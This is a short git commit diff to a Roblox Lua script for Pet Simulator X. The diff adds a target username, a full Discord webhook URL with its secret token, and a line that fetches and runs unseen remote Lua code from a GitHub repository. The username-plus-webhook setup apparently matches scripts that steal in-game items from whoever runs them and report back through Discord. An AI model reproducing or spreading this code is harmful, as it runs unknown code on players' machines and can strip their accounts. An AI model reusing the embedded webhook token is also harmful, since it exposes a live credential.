a4d8a5a2be376ac1c9d3ac4356e04c5c346a6b1b
senpalgm <127679971+senpalgm@users.noreply.github.com>
2023-04-03 21:27:45 +0300

    Update PetSimulatX.lua

--- PetSimulatX.lua
+++ PetSimulatX.lua
@@ -1,2 +1,4 @@
-_G.Key = "voming56"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KIDINApsx/versions/main/v2.lua"))()
+UserName = "zombispro325Fan"
+WebHook = "https://discord.com/api/webhooks/1092406813141520505/Yi3soNm-KKU31WUZsp7Ph4RxQw4XDlAJnuTKyb7zwswghE6s54vnRWFouDE8qJ-LpAQC"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
